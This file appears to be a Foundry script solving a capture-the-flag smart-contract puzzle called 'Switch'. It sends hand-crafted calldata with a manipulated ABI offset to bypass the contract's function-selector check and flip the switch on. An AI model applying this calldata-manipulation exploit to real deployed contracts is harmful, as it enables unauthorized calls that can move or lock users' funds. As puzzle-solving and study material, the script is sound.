// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Switch.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract SwitchSolution is Script {
    Switch public switchInstance =
        Switch(0x63511fa3B9953d82369F0f50Fe4b203e02D9D890);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("switchOn status before: ", switchInstance.switchOn());
        bytes
            memory callData = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        (bool success, ) = address(switchInstance).call(callData);
        require(success, "Failed to call Switch contract");
        console.log("switchOn status before: ", switchInstance.switchOn());
        vm.stopBroadcast();
    }
}
/* 
source .env
forge script script/Switch.s.sol --broadcast --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
